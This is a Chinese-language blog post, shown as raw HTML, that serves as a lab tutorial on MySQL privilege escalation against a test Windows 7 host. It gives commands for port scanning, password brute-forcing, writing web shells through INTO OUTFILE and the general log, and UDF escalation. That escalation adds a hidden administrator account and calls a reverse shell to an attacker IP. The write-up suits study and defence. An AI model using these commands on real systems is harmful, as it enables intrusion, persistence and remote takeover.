@@ -1,0 +1,139 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="RoboTerh"><meta name="copyright" content="RoboTerh"><meta name="generator" content="Hexo 5.4.0"><meta name="theme" content="hexo-theme-yun"><title>Mysql提权方法 | RoboTerh</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.25/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_dxory92pb0h.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".post-content img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
+    const Yun = window.Yun || {};
+    window.CONFIG = {"hostname":"roboterh.github.io","root":"/","title":["ROBO","TERH","BLOG","小站"],"version":"1.7.0","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><script>CONFIG.leancloudVisitors = {"enable":true,"app_id":"QzEMTRDcJM476WmFbFsyqtOV-MdYXbMMI","app_key":"Ovrs8D1mvkchhDyViQ6oVoQq","server_url":"https://roboterh.github.io"}</script><script defer src="/js/analytics/leancloud-visitors.js"></script><meta name="description" content="环境搭建win7的靶机(ip:192.168.153.132) + phpstudy搭建  将mysql设置为可以远程连接： 在mysql库中，有一个user表，通过select host,user from user;来查看登陆的host 将root用户改为任意的ip都可以登陆update user set host&#x3D;&#39;%&#39; where user&#x3D;&#39;root&#39;;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mysql提权方法">
+<meta property="og:url" content="https://roboterh.github.io/2022/04/14/Mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95/index.html">
+<meta property="og:site_name" content="RoboTerh">
+<meta property="og:description" content="环境搭建win7的靶机(ip:192.168.153.132) + phpstudy搭建  将mysql设置为可以远程连接： 在mysql库中，有一个user表，通过select host,user from user;来查看登陆的host 将root用户改为任意的ip都可以登陆update user set host&#x3D;&#39;%&#39; where user&#x3D;&#39;root&#39;;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://roboterh.github.io/2022/04/14/Mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95/image-20220414152810786.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/04/14/Mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95/image-20220414145050225.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/04/14/Mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95/image-20220414153605632.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/04/14/Mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95/image-20220414154144987.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/04/14/Mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95/image-20220414162713517.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/04/14/Mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95/image-20220414170646225.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/04/14/Mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95/image-20220414171127428.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/04/14/Mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95/image-20220414171321400.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/04/14/Mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95/image-20220414182447884.png">
+<meta property="article:published_time" content="2022-04-14T06:18:03.000Z">
+<meta property="article:modified_time" content="2022-04-14T11:32:07.365Z">
+<meta property="article:author" content="RoboTerh">
+<meta property="article:tag" content="mysql提权">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://roboterh.github.io/2022/04/14/Mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95/image-20220414152810786.png"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="RoboTerh"><img width="96" loading="lazy" src="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/8@XK~G6IIG(3~I6J~C6M4JB.png" alt="RoboTerh"><span class="site-author-status" title="wwww我好菜">-_-</span></a><div class="site-author-name"><a href="/about/">RoboTerh</a></div><span class="site-name">RoboTerh</span><sub class="site-subtitle"></sub><div class="site-desciption">无聊的时候记录记录自己的学习啊</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">50</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">16</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">37</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-settings-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/F0A770ED0C75BC233DA1034B4C80E8DA.png" title="QQ" target="_blank" style="color:#181717"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:2865153524@qq.com" title="E-Mail" target="_blank" style="color:8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%9D%83%E9%99%90"><span class="toc-number">2.</span> <span class="toc-text">获取权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E7%BA%B5%E6%9D%83%E9%99%90%E8%8E%B7%E5%8F%96"><span class="toc-number">2.1.</span> <span class="toc-text">数据库操纵权限获取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#mysql%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4"><span class="toc-number">2.1.1.</span> <span class="toc-text">mysql弱口令爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%9A%E8%BF%87hydra%E7%88%86%E7%A0%B4"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">通过hydra爆破</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%9A%E8%BF%87msf%E7%88%86%E7%A0%B4"><span class="toc-number">2.1.1.2.</span> <span class="toc-text">通过msf爆破</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%96%B9%E6%B3%95"><span class="toc-number">2.1.2.</span> <span class="toc-text">其他方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shell%E6%9D%83%E9%99%90%E8%8E%B7%E5%8F%96"><span class="toc-number">2.2.</span> <span class="toc-text">shell权限获取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#into-outfile"><span class="toc-number">2.2.1.</span> <span class="toc-text">into outfile</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E6%97%A5%E5%BF%97%E5%86%99shell"><span class="toc-number">2.2.2.</span> <span class="toc-text">通过日志写shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#UDF%E6%8F%90%E6%9D%83"><span class="toc-number">3.1.</span> <span class="toc-text">UDF提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%83"><span class="toc-number">3.1.1.</span> <span class="toc-text">手工提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E6%8F%90%E6%9D%83"><span class="toc-number">3.1.2.</span> <span class="toc-text">工具提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sqlmap%E6%8F%90%E6%9D%83"><span class="toc-number">3.1.3.</span> <span class="toc-text">sqlmap提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#msf%E6%8F%90%E6%9D%83"><span class="toc-number">3.1.4.</span> <span class="toc-text">msf提权</span></a></li></ol></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://RoboTerh.github.io/2022/04/14/Mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="RoboTerh"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="RoboTerh"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">Mysql提权方法</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="Created: 2022-04-14 14:18:03" itemprop="dateCreated datePublished" datetime="2022-04-14T14:18:03+08:00">2022-04-14</time></div><span class="leancloud_visitors" id="/2022/04/14/Mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95/" data-flag-title="Mysql提权方法"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Views"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span class="leancloud-visitors-count"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E6%8F%90%E6%9D%83/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">提权</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/mysql%E6%8F%90%E6%9D%83/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">mysql提权</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>win7的靶机(ip:192.168.153.132) + phpstudy搭建</p>
+<ol>
+<li><p>将mysql设置为可以远程连接：</p>
+<p>在mysql库中，有一个user表，通过<code>select host,user from user;</code>来查看登陆的host</p>
+<p>将root用户改为任意的ip都可以登陆<code>update user set host=&#39;%&#39; where user=&#39;root&#39;;</code></p>
+<p><img src="image-20220414152810786.png" alt="image-20220414152810786" loading="lazy"></p>
+</li>
+</ol>
+<h2 id="获取权限"><a href="#获取权限" class="headerlink" title="获取权限"></a>获取权限</h2><h3 id="数据库操纵权限获取"><a href="#数据库操纵权限获取" class="headerlink" title="数据库操纵权限获取"></a>数据库操纵权限获取</h3><h4 id="mysql弱口令爆破"><a href="#mysql弱口令爆破" class="headerlink" title="mysql弱口令爆破"></a>mysql弱口令爆破</h4><p>先使用nmap进行探测3306端口是否开放</p>
+<p><code>nmap -sV 192.168.153.132</code>: -sV通过开放的端口探测服务信息</p>
+<p><img src="image-20220414145050225.png" alt="image-20220414145050225" loading="lazy"></p>
+<p>开放了3306端口</p>
+<h5 id="通过hydra爆破"><a href="#通过hydra爆破" class="headerlink" title="通过hydra爆破"></a>通过hydra爆破</h5><p><img src="image-20220414153605632.png" alt="image-20220414153605632" loading="lazy"></p>
+<h5 id="通过msf爆破"><a href="#通过msf爆破" class="headerlink" title="通过msf爆破"></a>通过msf爆破</h5><ol>
+<li>msfconsole</li>
+<li>search mysql</li>
+<li>use xxx</li>
+<li>show options</li>
+<li>set xx xx</li>
+<li>run<br><img src="image-20220414154144987.png" alt="image-20220414154144987" loading="lazy"></li>
+</ol>
+<h4 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h4><p>通过sqlmap注入的–sql-shell模式</p>
+<p><img src="image-20220414162713517.png" alt="image-20220414162713517" loading="lazy"></p>
+<h3 id="shell权限获取"><a href="#shell权限获取" class="headerlink" title="shell权限获取"></a>shell权限获取</h3><p>写入shell需要具有写权限</p>
+<h4 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h4><p>如果load_file()可用即secure_file_priv无限制，且具有写权限</p>
+<p>secure_file_priv的值：</p>
+<table>
+<thead>
+<tr>
+<th align="left">Value</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">NULL</td>
+<td align="left">不允许导入或导出</td>
+</tr>
+<tr>
+<td align="left">/tmp</td>
+<td align="left">只允许在 /tmp 目录导入导出</td>
+</tr>
+<tr>
+<td align="left">空</td>
+<td align="left">不限制目录</td>
+</tr>
+</tbody></table>
+<p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</p>
+<p>在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p>
+<p>如果满足上述所有条件的话，那么可以尝试使用下面原生的 SQL 语句来直接写 shell：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">select</span> <span class="token string">'&lt;?php phpinfo(); ?>'</span> into outfile <span class="token string">'/var/www/html/info.php'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>sqlmap 中可以如下操作：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://x.x.x.x/?id=x"</span> --file-write<span class="token operator">=</span><span class="token string">"/Users/guang/Desktop/shell.php"</span> --file-dest<span class="token operator">=</span><span class="token string">"/var/www/html/test/shell.php"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="通过日志写shell"><a href="#通过日志写shell" class="headerlink" title="通过日志写shell"></a>通过日志写shell</h4><p>MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell</p>
+<p>win7靶机有一个phpmyadmin目录</p>
+<p><img src="image-20220414170646225.png" alt="image-20220414170646225" loading="lazy"></p>
+<p><code>general_log</code> 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。</p>
+<p>首先开启general_log:</p>
+<p>set global general_log=’on’;</p>
+<p><img src="image-20220414171127428.png" alt="image-20220414171127428" loading="lazy"></p>
+<p>之后shell就成功写入了</p>
+<p><img src="image-20220414171321400.png" alt="image-20220414171321400" loading="lazy"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>上面已经通过了日志写shell得到了shell权限，现在就需要提升权限了</p>
+<h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><p>UDF(user-defined function)是MySQL的一个拓展接口，也可称之为用户自定义函数，它是用来拓展 MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便 实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX()一样方便</p>
+<h4 id="手工提权"><a href="#手工提权" class="headerlink" title="手工提权"></a>手工提权</h4><p><strong>动态链接库</strong></p>
+<p>MySQL &gt;= 5.1 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\plugin 文件夹下文件夹下才能创建自定义函数</p>
+<p>使用msf工具的动态链接库</p>
+<p><img src="image-20220414182447884.png" alt="image-20220414182447884" loading="lazy"></p>
+<p>放入plugin目录之后</p>
+<p>创建命令执行函数</p>
+<p>create function sys_eval returns string soname “lib_mysqludf_sys.dll”;</p>
+<p>函数介绍： </p>
+<p>sys_eval，执行任意命令，并将输出返回。 </p>
+<p>sys_exec，执行任意命令，并将退出码返回。（但是不会有回显） </p>
+<p>sys_get，获取一个环境变量。 </p>
+<p>sys_set，创建或修改一个环境变量。 一般用于创建新用户维持权限</p>
+<p>命令：</p>
+<p>create function cmdshell returns string soname ‘moonudf.dll’ 【创建cmdshell】 </p>
+<p>select cmdshell(‘net user $darkmoon 123456 /add &amp; net localgroup administrators $darkmoon /add’) 【添加超级管理员】 </p>
+<p>select cmdshell(‘net user’) 【查看用户】 </p>
+<p>select cmdshell(‘netstat -an’) 【查看端口】 </p>
+<p>select name from mysql.func 【查看创建函数】 </p>
+<p>delete from mysql.func where name=’cmdshell’ 【删除cmdshell】 </p>
+<p>create function backshell returns string soname ‘moonudf.dll’ 【创建反弹函数】 </p>
+<p>select backshell(‘192.168.157.130’,12345) 【执行反弹】 </p>
+<p>delete from mysql.func where name=’backshell’ 【删除backshell】</p>
+<p><strong>寻找plugin目录</strong></p>
+<p>如果不存在，在mysql目录下新建<code>lib/plugin</code>文件夹</p>
+<h4 id="工具提权"><a href="#工具提权" class="headerlink" title="工具提权"></a>工具提权</h4><ul>
+<li><p>暗月脚本</p>
+<p>需要有plugin目录，和secure_file_priv=空，不为Null</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/11/mysql.html#toc-heading-11">MySQL 漏洞利用与提权 | 国光 (sqlsec.com)</a>这里面也有一个工具</p>
+</li>
+</ul>
+<h4 id="sqlmap提权"><a href="#sqlmap提权" class="headerlink" title="sqlmap提权"></a>sqlmap提权</h4><p>secure_file_priv需要为空，不能为null</p>
+<p>sqlmap -d “mysql://root:<a href="mailto:&#x72;&#111;&#111;&#116;&#64;&#x31;&#x39;&#50;&#46;&#49;&#x36;&#56;&#x2e;&#49;&#53;&#x33;&#x2e;&#x31;&#x33;&#x32;">&#x72;&#111;&#111;&#116;&#64;&#x31;&#x39;&#50;&#46;&#49;&#x36;&#56;&#x2e;&#49;&#53;&#x33;&#x2e;&#x31;&#x33;&#x32;</a>:3306/mysql” –os-shell</p>
+<h4 id="msf提权"><a href="#msf提权" class="headerlink" title="msf提权"></a>msf提权</h4><p>适合5.5.9以下版本</p>
+</div><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="Donate" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">I'm so cute. Please give me money.</div><div id="qr" style="display:none;"><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/B01E5F9A0F70645FFD7D980FB6243619.jpg"><img loading="lazy" src="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/B01E5F9A0F70645FFD7D980FB6243619.jpg" alt="支付宝" title="支付宝"></a><div><span style="color:#00A3EE"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-alipay-line"></use></svg></span></div></div><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/D4AD9FA7BDA95604D2919F414577B0BA.png"><img loading="lazy" src="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/D4AD9FA7BDA95604D2919F414577B0BA.png" alt="QQ 支付" title="QQ 支付"></a><div><span style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></span></div></div><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/E8775427D2C8BC65C9AC73AE4CE5A3D8.jpg"><img loading="lazy" src="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/E8775427D2C8BC65C9AC73AE4CE5A3D8.jpg" alt="微信支付" title="微信支付"></a><div><span style="color:#2DC100"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-pay-line"></use></svg></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>Post author: </strong>RoboTerh</li><li class="post-copyright-link"><strong>Post link: </strong><a href="https://roboterh.github.io/2022/04/14/Mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95/" title="Mysql提权方法">https://roboterh.github.io/2022/04/14/Mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95/</a></li><li class="post-copyright-license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> unless otherwise stated.</li></ul><script>document.addEventListener('copy', function (event) {
+  const clipboardData = event.clipboardData || window.clipboardData;
+  if (!clipboardData) { return; }
+  const text = window.getSelection().toString();
+  if (text) {
+    event.preventDefault();
+    clipboardData.setData('text/plain', text + '\n\nPost author: RoboTerh\nPost link: https://roboterh.github.io/2022/04/14/Mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95/\nCopyright Notice: All articles in this blog are licensed under CC BY-NC-SA 4.0 unless otherwise stated.');
+  }
+});</script></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2022/04/15/ysoserial%E5%88%86%E6%9E%90%E4%B9%8BC3P0/" rel="prev" title="ysoserial分析之C3P0"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-left-s-line"></use></svg><span class="post-nav-text">ysoserial分析之C3P0</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2022/04/12/Linux%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF/" rel="next" title="Linux提权思路"><span class="post-nav-text">Linux提权思路</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>要不要和我说些什么？</span><br></div></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2022 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> RoboTerh</span></div><div class="powered"><span>Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> v5.4.0</span><span class="footer-separator">|</span><span>Theme - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.7.0</span></div></footer><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a></div></body></html>
